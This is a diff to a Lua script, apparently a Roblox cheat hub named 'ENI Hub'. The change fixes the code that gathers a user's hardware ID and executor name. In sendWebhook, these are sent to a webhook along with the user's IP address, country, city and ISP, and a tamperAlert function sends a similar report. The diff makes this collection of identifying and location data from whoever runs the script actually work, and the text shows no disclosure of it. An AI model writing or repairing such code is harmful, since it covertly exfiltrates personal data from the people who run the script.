@@ -185,11 +185,13 @@ end
 
 local function sendWebhook(k)
     local ip, country, city, isp = _getIP()
-    local hwid = (pcall(function() return gethwid and gethwid() or "?" end) and nil) or "?"
-    local exec = (pcall(function()
-        local i = identifyexecutor and identifyexecutor()
-        return type(i)=="table" and (i.name or i[1]) or tostring(i)
-    end) and nil) or "?"
+    local hwid = "?"
+    local okH, vH = pcall(gethwid); if okH and vH then hwid = vH end
+    local exec = "?"
+    local okE, vE = pcall(identifyexecutor)
+    if okE and vE then
+        if type(vE) == "table" then exec = vE.name or vE[1] or "?" else exec = tostring(vE) end
+    end
     local body = HttpService:JSONEncode({
         username = "ENI Hub",
         embeds = {{
@@ -220,10 +222,11 @@ end
 local function tamperAlert()
     if _sent then return end
     _sent = true
-    local exec = (pcall(function()
-        local i = identifyexecutor and identifyexecutor()
-        return type(i)=="table" and (i.name or i[1]) or tostring(i)
-    end) and nil) or "?"
+    local exec = "?"
+    local okE, vE = pcall(identifyexecutor)
+    if okE and vE then
+        if type(vE) == "table" then exec = vE.name or vE[1] or "?" else exec = tostring(vE) end
+    end
     local body = HttpService:JSONEncode({
         username = "ENI Hub",
         embeds = {{
